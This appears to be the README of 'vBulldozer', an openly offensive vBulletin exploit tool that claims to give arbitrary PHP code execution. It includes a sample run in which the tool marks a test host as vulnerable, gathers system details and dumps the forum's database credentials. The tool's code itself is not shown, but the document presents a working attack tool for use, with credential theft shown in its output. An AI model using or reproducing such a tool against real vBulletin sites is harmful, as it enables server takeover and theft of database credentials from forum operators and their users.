# vBulldozer
Very loud vBulletin exploit, WIP.

Currently gives you a way to execute arbritary PHP code, and does some info-gathering. Deliberately loud as heck. 

More features coming later, once I am done debugging some PHP stuff.

```
$ python vBulldozer.py https://vb.test.local/
{+} Checking https://vb.test.local/
{*} Target is vulnerable!
{+} Proceeding...
{+} Gathering some system information...
{>} PHP uname: Linux vb 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
{>} Current UID: 33
{>} Current Dir: /var/www/html
{+} Gathering database credentials...
{>} Database Host: localhost
{>} Database User: vb
{>} Database Pass: password123
$
```
